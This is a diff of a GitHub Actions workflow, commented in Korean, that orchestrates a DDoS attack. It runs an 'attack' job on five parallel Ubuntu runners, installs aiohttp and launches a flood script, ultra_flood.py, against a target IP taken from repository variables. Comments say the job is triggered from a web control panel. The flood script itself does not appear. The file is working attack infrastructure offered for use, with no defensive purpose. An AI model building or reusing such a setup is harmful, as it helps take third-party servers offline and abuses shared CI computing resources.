@@ -1,23 +1,20 @@
-name: DDoS_Master_Hosting
-on: 
-  workflow_dispatch: # 웹 패널에서 버튼 클릭 시 실행
+name: Native_DDoS_Engine
+on:
+  workflow_dispatch: # 패널에서 버튼 누른 후 여기서 실행
 
 jobs:
-  flood_nodes:
+  attack:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        node: [1, 2, 3, 4, 5] # 5대의 독립된 서버 자원 할당
+        node: [1, 2, 3, 4, 5]
     steps:
       - uses: actions/checkout@v3
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-      - name: Install Dependencies
+      - name: Install
         run: pip install aiohttp
-      - name: Execute Attack
+      - name: Launch
         env:
-          TARGET_IP: ${{ vars.TARGET_IP }}
-          STRENGTH: ${{ vars.STRENGTH }}
-        run: python3 ultra_flood.py
+          TARGET: ${{ vars.TARGET_IP }} # 깃허브 변수에서 즉시 가져옴
+        run: |
+          # 비동기 엔진(ultra_flood.py) 실행
+          python3 ultra_flood.py
